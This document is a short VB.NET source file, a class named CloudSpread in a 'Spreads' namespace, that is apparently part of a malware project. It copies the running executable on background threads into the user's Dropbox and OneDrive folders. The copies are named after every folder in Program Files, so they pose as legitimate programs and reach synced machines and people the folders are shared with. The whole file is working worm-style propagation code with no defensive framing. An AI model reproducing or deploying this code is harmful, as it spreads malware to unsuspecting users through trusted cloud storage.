Imports System.IO

Namespace Spreads
    Public Class CloudSpread
        Dim DropboxFolder As String = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "Dropbox") & "\"
        Dim OneDriveFolder As String = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "OneDrive") & "\"
        Public Function DropBox()
            Dim t As New Threading.Thread(AddressOf DropBoxSpread)
            t.IsBackground = True
            t.Start()
            Return True
        End Function
        Public Function OneDrive()
            Dim t As New Threading.Thread(AddressOf OneDriveSpread)
            t.IsBackground = True
            t.Start()
            Return True
        End Function
        Private Function DropBoxSpread()
            If (Directory.Exists(DropboxFolder) = True) Then
                For Each fname As String In ProgramList()
                    File.Copy(Application.ExecutablePath, Path.Combine(DropboxFolder, fname & ".exe"), True)
                Next
                Return True
            Else
                Return False
            End If
        End Function
        Private Function OneDriveSpread()
            If (Directory.Exists(OneDriveFolder) = True) Then
                For Each fname As String In ProgramList()
                    File.Copy(Application.ExecutablePath, Path.Combine(OneDriveFolder, fname & ".exe"), True)
                Next
                Return True
            Else
                Return False
            End If
        End Function
        Public Function ProgramList() As List(Of String)
                Dim NameList As New List(Of String)
                Dim folderPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
                For Each text As String In Directory.GetDirectories(folderPath)
                    Dim text2 As String = text.Substring(text.LastIndexOf("\")).Replace("\", String.Empty)
                    NameList.Add(text2)
                Next
                Return NameList
        End Function
    End Class
End Namespace
